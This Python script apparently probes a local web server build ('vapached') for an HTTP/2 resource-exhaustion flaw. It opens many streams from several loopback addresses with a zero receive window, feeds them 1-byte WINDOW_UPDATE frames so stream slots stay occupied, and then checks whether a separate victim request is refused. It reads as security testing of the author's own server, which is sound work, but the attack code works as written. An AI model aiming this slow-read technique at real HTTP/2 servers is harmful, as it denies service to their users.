#!/usr/bin/env python3
"""P31 probe: HTTP/2 stream-slot hold via zero-window + 1-byte WINDOW_UPDATE trickle.

For each source address, open one TLS/h2 connection, set the client's
INITIAL_WINDOW_SIZE to 0, issue 32 GETs for a large file, then grant 1 byte
per stream every few seconds.  The server's send deadline renews on any
progress, so the process-wide stream slots stay occupied indefinitely.

Then probe from a different source address and check whether the new request
is refused.
"""

import argparse
import socket
import ssl
import subprocess
import sys
import threading
import time
from pathlib import Path

import h2.config
import h2.connection
import h2.events
import h2.settings

ROOT = Path(__file__).resolve().parents[2]
VAPACHED = ROOT / "target/release/vapached"
RUN = Path("/tmp/opencode/p31-h2hold")
TLS_PORT = 19992
PLAIN_PORT = 19999


def setup() -> None:
    import shutil

    shutil.rmtree(RUN, ignore_errors=True)
    for d in ("logs", "www"):
        (RUN / d).mkdir(parents=True, exist_ok=True)
    (RUN / "www" / "big.bin").write_bytes(b"A" * (4 * 1024 * 1024))
    (RUN / "www" / "small.txt").write_bytes(b"small-p31\n")
    subprocess.run(
        [
            "openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
            "-days", "2", "-subj", "/CN=p31.local",
            "-keyout", str(RUN / "key.pem"), "-out", str(RUN / "cert.pem"),
        ],
        check=True, capture_output=True,
    )
    (RUN / "cert.pem").chmod(0o644)
    (RUN / "key.pem").chmod(0o600)
    conf = RUN / "httpd.conf"
    conf.write_text(
        f'''ServerRoot "{RUN}"
Listen 127.0.0.1:{PLAIN_PORT}
Listen 127.0.0.1:{TLS_PORT}
User www-data
Group www-data
PidFile "{RUN}/logs/pid"
ErrorLog "{RUN}/logs/error.log"
LogLevel warn
ServerName p31.local
Timeout 60
KeepAliveTimeout 5
DocumentRoot "{RUN}/www"
<Directory />
    Require all denied
</Directory>
<Directory "{RUN}/www">
    Options FollowSymLinks
    AllowOverride None
    Require all granted
</Directory>
<VirtualHost 127.0.0.1:{TLS_PORT}>
    ServerName p31.local
    SSLEngine on
    SSLCertificateFile "{RUN}/cert.pem"
    SSLCertificateKeyFile "{RUN}/key.pem"
    DocumentRoot "{RUN}/www"
    <Directory "{RUN}/www">
        Options FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>
</VirtualHost>
'''
    )
    conf.chmod(0o644)
    (RUN / "logs" / "error.log").touch()
    (RUN / "logs" / "error.log").chmod(0o644)
    (RUN / "logs" / "pid").touch()
    (RUN / "logs" / "pid").chmod(0o644)


def start() -> subprocess.Popen:
    log = (RUN / "server.out").open("wb")
    p = subprocess.Popen(
        [str(VAPACHED), "-f", str(RUN / "httpd.conf"), "-DFOREGROUND"],
        stdout=log, stderr=subprocess.STDOUT, start_new_session=True,
    )
    for _ in range(200):
        if p.poll() is not None:
            raise SystemExit(f"vapached exited: { (RUN/'server.out').read_text(errors='replace') }")
        try:
            socket.create_connection(("127.0.0.1", PLAIN_PORT), timeout=0.3).close()
            return p
        except OSError:
            time.sleep(0.05)
    raise SystemExit("vapached did not start")


def tls_socket(host: str, source: str | None = None) -> ssl.SSLSocket:
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if source:
        raw.bind((source, 0))
    raw.settimeout(10)
    raw.connect((host, TLS_PORT))
    s = ctx.wrap_socket(raw, server_hostname="p31.local")
    assert s.selected_alpn_protocol() == "h2", s.selected_alpn_protocol()
    return s


class Attacker:
    def __init__(self, source: str, streams: int, path: str = "/big.bin"):
        self.source = source
        self.streams = streams
        self.path = path
        self.sock = tls_socket("127.0.0.1", source)
        cfg = h2.config.H2Configuration(client_side=True, header_encoding=None)
        self.conn = h2.connection.H2Connection(config=cfg)
        self.conn.initiate_connection()
        # Zero the client's receive window for server->client DATA.
        self.conn.update_settings({h2.settings.SettingCodes.INITIAL_WINDOW_SIZE: 0})
        self.sock.sendall(self.conn.data_to_send())
        # Wait for the server SETTINGS (MAX_CONCURRENT_STREAMS).
        self.conn.receive_data(self.sock.recv(65536))
        opened = 0
        for _ in range(streams):
            sid = self.conn.get_next_available_stream_id()
            self.conn.send_headers(
                sid,
                [
                    (b":method", b"GET"),
                    (b":scheme", b"https"),
                    (b":authority", b"p31.local"),
                    (b":path", self.path.encode()),
                ],
                end_stream=True,
            )
            opened += 1
        self.sock.sendall(self.conn.data_to_send())
        self.stream_ids = list(range(1, opened * 2, 2))
        self.buf = b""

    def drain(self, timeout: float = 0.01) -> None:
        self.sock.settimeout(timeout)
        try:
            data = self.sock.recv(65536)
            if data:
                self.conn.receive_data(data)
                self.sock.sendall(self.conn.data_to_send())
        except (TimeoutError, socket.timeout, OSError):
            pass
        finally:
            self.sock.settimeout(10)

    def trickle(self, amount: int = 1) -> None:
        for sid in self.stream_ids:
            try:
                self.conn.increment_flow_control_window(amount, stream_id=sid)
            except Exception:
                pass
        self.sock.sendall(self.conn.data_to_send())
        self.drain(0.0)

    def close(self) -> None:
        try:
            self.sock.close()
        except OSError:
            pass


def victim_probe(source: str | None = None, path: str = "/small.txt") -> str:
    try:
        sock = tls_socket("127.0.0.1", source)
    except Exception as e:
        return f"connect-error:{e}"
    cfg = h2.config.H2Configuration(client_side=True, header_encoding=None)
    conn = h2.connection.H2Connection(config=cfg)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())
    conn.receive_data(sock.recv(65536))
    sid = conn.get_next_available_stream_id()
    conn.send_headers(
        sid,
        [
            (b":method", b"GET"),
            (b":scheme", b"https"),
            (b":authority", b"p31.local"),
            (b":path", path.encode()),
        ],
        end_stream=True,
    )
    sock.sendall(conn.data_to_send())
    status = None
    body = b""
    reset = None
    terminated = None
    deadline = time.time() + 8
    sock.settimeout(2)
    try:
        while time.time() < deadline:
            data = sock.recv(65536)
            if not data:
                break
            events = conn.receive_data(data)
            for ev in events:
                if isinstance(ev, h2.events.ResponseReceived):
                    for k, v in ev.headers:
                        if k == b":status":
                            status = v
                elif isinstance(ev, h2.events.DataReceived):
                    body += ev.data
                    conn.acknowledge_received_data(ev.flow_controlled_length, ev.stream_id)
                elif isinstance(ev, h2.events.StreamReset):
                    reset = ev.error_code
                elif isinstance(ev, h2.events.ConnectionTerminated):
                    terminated = ev.error_code
            sock.sendall(conn.data_to_send())
            if status or reset is not None or terminated is not None:
                break
    except (TimeoutError, socket.timeout, OSError):
        pass
    finally:
        sock.close()
    return f"status={status} reset={reset} terminated={terminated} body={len(body)}"


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--sources", type=int, default=8)
    ap.add_argument("--per-source", type=int, default=32)
    ap.add_argument("--hold-seconds", type=int, default=90)
    ap.add_argument("--trickle", type=int, default=1)
    args = ap.parse_args()

    setup()
    proc = start()
    try:
        print("baseline victim:", victim_probe())
        attackers = []
        for i in range(args.sources):
            src = f"127.0.0.{i + 2}"
            a = Attacker(src, args.per_source)
            attackers.append(a)
            print(f"opened {args.per_source} streams from {src}")
        time.sleep(1)
        print("during (no trickle yet):", victim_probe())
        # Holder refresh loop with 1-byte window updates.
        end = time.time() + args.hold_seconds
        cycle = 0
        while time.time() < end:
            time.sleep(3)
            for a in attackers:
                a.trickle(args.trickle)
            cycle += 1
            if cycle % 5 == 0:
                print(f"t={int(time.time() - (end - args.hold_seconds))}s "
                      f"(after {cycle} trickle cycles) victim: {victim_probe()}")
        print("during (trickled):", victim_probe())
        for a in attackers:
            a.close()
        time.sleep(1)
        print("after release:", victim_probe())
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()


if __name__ == "__main__":
    main()
